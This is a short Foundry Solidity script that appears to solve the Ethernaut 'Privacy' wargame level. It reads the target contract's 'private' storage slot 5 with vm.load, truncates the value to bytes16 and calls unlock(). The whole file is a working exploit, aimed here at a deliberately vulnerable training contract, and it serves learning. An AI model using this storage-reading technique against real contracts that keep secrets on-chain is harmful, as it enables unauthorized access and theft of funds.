// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IPrivacy {
    function locked() external view returns (bool);

    function unlock(bytes16 _key) external;
}

contract PoC is Script {
    address private immutable privacy =
        0x8872CAE2EB50a5C77B4B0b323F0071DbAbD19025; // Replace with your Privacy instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        bytes32 key = vm.load(privacy, bytes32(uint256(5)));
        IPrivacy(privacy).unlock(bytes16(key));

        console2.log(
            "This should be unlocked by now, right?",
            IPrivacy(privacy).locked()
        );

        vm.stopBroadcast();
    }
}
